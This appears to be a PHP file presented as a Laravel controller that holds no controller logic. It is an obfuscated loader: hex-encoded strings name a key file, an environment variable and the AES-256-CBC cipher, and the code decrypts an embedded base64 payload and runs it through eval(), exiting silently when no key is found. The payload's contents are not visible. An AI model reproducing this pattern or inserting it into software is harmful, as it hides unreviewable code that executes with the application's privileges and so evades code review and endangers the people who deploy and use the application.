<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('bAq1D75GCIcn6zJYw6dFPg==');

$c=base64_decode(

'J21p1c8/7Nb+JYkNHGTwNLXfO+cT7VntWVSshivm7DM9qIcIGPpKsbZS/u07sz6SowCZ3iI2Pm6i' .
'APUXuoU9fpNFkVX60zi8cuyRbkNdAzQMIJTN50rMYAGbvPDddIsRWoV32Vs9VQnxSkpUKIA+4FOX' .
'IZm8TSHEjfGl0pPXZdqh3ytPmnH4XSzOQNrtjQdLGCssf6bhYuSbklEAK+pYWi6A+b+lt/t4UF/M' .
'ZyGBYS68Hyvq+dkObDrAHLbOcvZA'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

